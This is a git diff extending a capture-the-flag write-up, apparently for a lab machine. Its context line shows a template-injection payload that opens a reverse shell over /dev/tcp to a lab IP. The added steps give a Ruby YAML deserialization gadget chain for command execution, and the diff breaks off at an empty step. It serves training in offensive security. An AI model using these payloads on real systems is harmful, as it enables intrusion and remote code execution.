@@ -132,3 +132,48 @@ http://10.10.14.12:8000/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.1
 ```
 3e73f31984a909e91e2952956243e048
 ```
+
+18. Now for the root flag, we need to do privilege escalation.
+
+![image](https://user-images.githubusercontent.com/70703371/211283528-aa43f568-2da8-4446-8dd2-9f03df4ef2f8.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/211283681-9058d08a-0cb8-476d-85b1-a0ed887b1b1f.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/211283919-d9f6f185-50df-428a-93cd-c0ea01e8b8e3.png)
+
+
+19. Got a clue here:
+
+![image](https://user-images.githubusercontent.com/70703371/211284959-72f6a994-de97-43dc-bdb6-7ddde19ab333.png)
+
+
+20. Maybe we can do RCE through YAML upload file.
+21. I did a small outsource about this yaml exploit. Turns out find [this](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) website and there's a ruby script to do RCE.
+
+> THE SCRIPT
+
+```rb
+ ---
+ - !ruby/object:Gem::Installer
+     i: x
+ - !ruby/object:Gem::SpecFetcher
+     i: y
+ - !ruby/object:Gem::Requirement
+   requirements:
+     !ruby/object:Gem::Package::TarReader
+     io: &1 !ruby/object:Net::BufferedIO
+       io: &1 !ruby/object:Gem::Package::TarReader::Entry
+          read: 0
+          header: "abc"
+       debug_output: &1 !ruby/object:Net::WriteAdapter
+          socket: &1 !ruby/object:Gem::RequestSet
+              sets: !ruby/object:Net::WriteAdapter
+                  socket: !ruby/module 'Kernel'
+                  method_id: :system
+              git_set: sleep 600
+          method_id: :resolve 
+```
+
+22. 
